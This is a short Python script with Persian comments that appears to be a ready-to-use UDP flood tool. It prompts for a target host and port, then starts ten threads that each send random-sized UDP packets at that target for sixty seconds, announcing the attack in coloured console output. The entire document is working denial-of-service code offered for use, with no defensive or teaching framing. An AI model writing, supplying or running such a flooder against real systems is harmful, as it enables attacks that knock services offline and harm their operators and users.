import socket
import threading
import random
import time
import os
import sys

# دریافت آدرس و پورت هدف
input_string = input("Enter Your Target Host And Port (e.g., example.com:7777): ")
target, port = input_string.split(':')
host = socket.gethostbyname(target)
port = int(port)

# تنظیمات حمله
times = 60  # مدت زمان حمله (ثانیه)
threads = 10  # تعداد تردهای همزمان

os.system('cls' if os.name == 'nt' else 'clear')

print(f"\033[1;35m[+] Attacking {host}:{port} for {times} seconds...\033[0m")
print("________________________________________________")
print(f"\033[1;36m[+] Method: UDP Flood | Threads: {threads}\033[0m")

# تابع ارسال بسته‌ها
def attack(host, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while time.time() < timeout:
        packet = random._urandom(random.randint(10, 1024))  # ایجاد بسته تصادفی
        sock.sendto(packet, (host, port))

# اجرای چندین ترد برای افزایش قدرت حمله
for _ in range(threads):
    threading.Thread(target=attack, args=(host, port, times)).start()
